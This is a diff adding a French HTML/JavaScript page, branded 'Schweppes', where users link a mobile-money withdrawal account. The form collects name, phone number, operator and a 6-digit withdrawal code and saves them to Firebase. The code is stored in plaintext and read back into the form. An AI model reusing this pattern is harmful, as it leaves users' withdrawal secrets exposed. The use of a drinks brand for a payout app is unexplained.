@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schweppes - Compte de Retrait</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            border-radius: 20px 20px 0 0;
+            padding: 25px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background: #f0f0f0;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 20px;
+        }
+
+        .back-btn:hover {
+            background: #667eea;
+            color: white;
+            transform: scale(1.05);
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            flex: 1;
+        }
+
+        .card {
+            background: white;
+            border-radius: 0 0 20px 20px;
+            padding: 30px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 8px;
+        }
+
+        .field-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+
+        .field-input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        .operator-selector {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #f9f9f9;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .operator-selector:hover {
+            border-color: #667eea;
+            background: white;
+        }
+
+        .selected-type {
+            font-size: 16px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .arrow {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 999;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .bottom-sheet {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            border-radius: 30px 30px 0 0;
+            padding: 30px;
+            transform: translateY(100%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+            max-height: 60vh;
+            overflow-y: auto;
+        }
+
+        .bottom-sheet.active {
+            transform: translateY(0);
+        }
+
+        .sheet-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .sheet-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .operator {
+            padding: 18px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            background: #f9f9f9;
+        }
+
+        .operator:hover {
+            border-color: #667eea;
+            background: white;
+        }
+
+        .operator.selected {
+            border-color: #667eea;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .sheet-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .sheet-btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cancel-btn {
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .cancel-btn:hover {
+            background: #e0e0e0;
+        }
+
+        .confirm-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .confirm-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        #message {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 2000;
+            min-width: 300px;
+            max-width: 90%;
+        }
+
+        .message-success,
+        .message-error {
+            padding: 18px 25px;
+            border-radius: 12px;
+            font-weight: 600;
+            text-align: center;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+        }
+
+        .message-success {
+            background: #4caf50;
+            color: white;
+        }
+
+        .message-error {
+            background: #f44336;
+            color: white;
+        }
+
+        .info-text {
+            font-size: 13px;
+            color: #999;
+            margin-top: 8px;
+        }
+
+        .alert-info {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .alert-info strong {
+            color: #1976d2;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        .alert-info ul {
+            margin: 10px 0 0 20px;
+            color: #555;
+        }
+
+        .alert-info li {
+            margin-bottom: 8px;
+        }
+
+        .alert-info li strong {
+            display: inline;
+            color: #1976d2;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div id="message"></div>
+
+    <div class="container">
+        <div class="header animate__animated animate__fadeInDown">
+            <button class="back-btn" onclick="window.history.back()">←</button>
+            <h1 class="header-title">Schweppes compte de retrait</h1>
+        </div>
+
+        <div class="card animate__animated animate__fadeInUp">
+            <div class="alert-info">
+                <strong>⚠️ Important :</strong> Veuillez lier correctement votre compte en respectant les consignes suivantes :
+                <ul>
+                    <li>Utilisez un <strong>code de retrait à 6 chiffres</strong></li>
+                    <li>Incluez <strong>l'indicatif de votre pays</strong> (ex: +229 pour la Bénin, +225 pour la Côte d'Ivoire)</li>
+                    <li>Format du numéro : <strong>+2250000000000</strong></li>
+                </ul>
+            </div>
+
+            <div class="form-group">
+                <label class="field-label">Nom du propriétaire</label>
+                <input type="text" id="ownerName" class="field-input" placeholder="Entrez votre nom complet">
+            </div>
+
+            <div class="form-group">
+                <label class="field-label">Numéro de compte</label>
+                <input type="tel" id="phone" class="field-input" placeholder="Ex: +243712345678">
+                <div class="info-text">N'oubliez pas l'indicatif du pays</div>
+            </div>
+
+            <div class="form-group">
+                <label class="field-label">Opérateur</label>
+                <div id="operatorSelector" class="operator-selector">
+                    <span id="selectedType" class="selected-type">MTN</span>
+                    <span class="arrow">▼</span>
+                </div>
+                <input type="hidden" id="operator" value="MTN">
+            </div>
+
+            <div class="form-group">
+                <label class="field-label">Code de retrait (6 chiffres)</label>
+                <input type="password" id="code" class="field-input" placeholder="Entrez 6 chiffres" maxlength="6">
+                <div class="info-text">Ce code à 6 chiffres sécurisera vos retraits</div>
+            </div>
+
+            <button id="submitBtn" class="submit-btn">Enregistrer</button>
+        </div>
+    </div>
+
+    <div id="overlay" class="overlay"></div>
+
+    <div id="bottomSheet" class="bottom-sheet">
+        <div class="sheet-header">
+            <h3 class="sheet-title">Choisir l'opérateur</h3>
+        </div>
+
+        <div class="operator selected" data-operator="MTN">MTN</div>
+        <div class="operator" data-operator="Orange">Orange</div>
+        <div class="operator" data-operator="Airtel">Airtel</div>
+        <div class="operator" data-operator="Moov">Moov</div>
+        <div class="operator" data-operator="Wave">Wave</div>
+
+        <div class="sheet-actions">
+            <button id="cancelBtn" class="sheet-btn cancel-btn">Annuler</button>
+            <button id="confirmBtn" class="sheet-btn confirm-btn">Confirmer</button>
+        </div>
+    </div>
+
+<script type="module">
+// --- Import des modules Firebase ---
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
+import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+
+// 🔥 Configuration Firebase SCHWEPPES (NOUVELLE BASE)
+const firebaseConfig = {
+    apiKey: "AIzaSyATz_ogu08DUoKSYKy6t2cHWdleUD-Fbrk",
+    authDomain: "schweppes-15df3.firebaseapp.com",
+    databaseURL: "https://schweppes-15df3-default-rtdb.firebaseio.com",
+    projectId: "schweppes-15df3",
+    storageBucket: "schweppes-15df3.firebasestorage.app",
+    messagingSenderId: "1011077098372",
+    appId: "1:1011077098372:web:64f9ad3a8e93f68c070bd1"
+};
+
+// --- Initialisation Firebase (CORRIGÉE) ---
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);  // ✅ AJOUTÉ (app) - BUG CORRIGÉ
+const auth = getAuth(app);    // ✅ AJOUTÉ (app) - BUG CORRIGÉ
+
+// --- Éléments DOM ---
+const operatorSelector = document.getElementById('operatorSelector');
+const bottomSheet = document.getElementById('bottomSheet');
+const overlay = document.getElementById('overlay');
+const cancelBtn = document.getElementById('cancelBtn');
+const confirmBtn = document.getElementById('confirmBtn');
+const submitBtn = document.getElementById('submitBtn');
+const options = document.querySelectorAll('.operator');
+const selectedTypeDisplay = document.getElementById('selectedType');
+const operatorInput = document.getElementById('operator');
+
+let currentSelection = 'MTN';
+let tempSelection = 'MTN';
+
+// --- Fonctions Bottom Sheet ---
+function openBottomSheet() {
+    bottomSheet.classList.add('active');
+    overlay.classList.add('active');
+    tempSelection = currentSelection;
+
+    options.forEach(option => {
+        option.classList.toggle('selected', option.dataset.operator === tempSelection);
+    });
+}
+
+function closeBottomSheet() {
+    bottomSheet.classList.remove('active');
+    overlay.classList.remove('active');
+    tempSelection = currentSelection;
+}
+
+function confirmSelection() {
+    currentSelection = tempSelection;
+    selectedTypeDisplay.textContent = currentSelection;
+    operatorInput.value = currentSelection;
+    closeBottomSheet();
+}
+
+// --- Gestion des événements Bottom Sheet ---
+operatorSelector.addEventListener('click', openBottomSheet);
+overlay.addEventListener('click', closeBottomSheet);
+cancelBtn.addEventListener('click', closeBottomSheet);
+confirmBtn.addEventListener('click', confirmSelection);
+
+options.forEach(option => {
+    option.addEventListener('click', () => {
+        options.forEach(opt => opt.classList.remove('selected'));
+        option.classList.add('selected');
+        tempSelection = option.dataset.operator;
+    });
+});
+
+// --- Affichage des messages ---
+function showMessage(text, type) {
+    const messageDiv = document.getElementById('message');
+    messageDiv.innerHTML = `
+        <div class="message-${type} animate__animated animate__fadeIn">
+            ${text}
+        </div>
+    `;
+
+    setTimeout(() => { messageDiv.innerHTML = ''; }, 5000);
+}
+
+// --- Validation du formulaire ---
+function validateForm() {
+    const ownerName = document.getElementById('ownerName').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const code = document.getElementById('code').value.trim();
+
+    if (!ownerName) { showMessage('Le nom du propriétaire est requis', 'error'); return false; }
+    if (!phone) { showMessage('Le numéro de compte est requis', 'error'); return false; }
+    if (!phone.startsWith('+')) { showMessage('Le numéro doit inclure l\'indicatif du pays (ex: +243)', 'error'); return false; }
+    if (!code) { showMessage('Le code de retrait est requis', 'error'); return false; }
+    if (code.length !== 6) { showMessage('Le code de retrait doit contenir exactement 6 chiffres', 'error'); return false; }
+    if (!/^\d+$/.test(code)) { showMessage('Le code de retrait doit contenir uniquement des chiffres', 'error'); return false; }
+
+    return true;
+}
+
+// --- Enregistrement de la configuration de retrait ---
+async function setupWithdrawal() {
+    if (!validateForm()) return;
+
+    const ownerName = document.getElementById('ownerName').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const code = document.getElementById('code').value.trim();
+    const operator = operatorInput.value;
+
+    try {
+        const user = auth.currentUser;
+        if (!user) {
+            showMessage('Vous devez être connecté pour effectuer cette opération', 'error');
+            setTimeout(() => window.location.href = 'login.html', 2000);
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Enregistrement en cours...';
+
+        await set(ref(db, `users/${user.uid}/withdrawalConfig`), {
+            ownerName,
+            phone,
+            operator,
+            code,
+            configuredAt: Date.now(),
+            lastUpdated: new Date().toISOString()
+        });
+
+        showMessage('Configuration enregistrée avec succès !', 'success');
+        setTimeout(() => window.location.href = 'carte.html', 2000);
+
+    } catch (error) {
+        console.error('Erreur lors de l\'enregistrement:', error);
+        showMessage(`Erreur: ${error.message}`, 'error');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Enregistrer';
+    }
+}
+
+// --- Charger les données existantes ---
+function loadExistingData() {
+    const user = auth.currentUser;
+    if (!user) return;
+
+    const configRef = ref(db, `users/${user.uid}/withdrawalConfig`);
+    onValue(configRef, (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+            document.getElementById('ownerName').value = data.ownerName || '';
+            document.getElementById('phone').value = data.phone || '';
+            document.getElementById('code').value = data.code || '';
+            currentSelection = data.operator || 'MTN';
+            selectedTypeDisplay.textContent = currentSelection;
+            operatorInput.value = currentSelection;
+        }
+    });
+}
+
+// --- Écoute de l'état de l'utilisateur ---
+onAuthStateChanged(auth, (user) => {
+    if (!user) {
+        window.location.href = 'login.html';
+        return;
+    }
+    loadExistingData();
+});
+
+// --- Événements du formulaire ---
+submitBtn.addEventListener('click', setupWithdrawal);
+
+document.querySelectorAll('.field-input').forEach(input => {
+    input.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') setupWithdrawal();
+    });
+});
+</script>
+
+</body>
+</html>
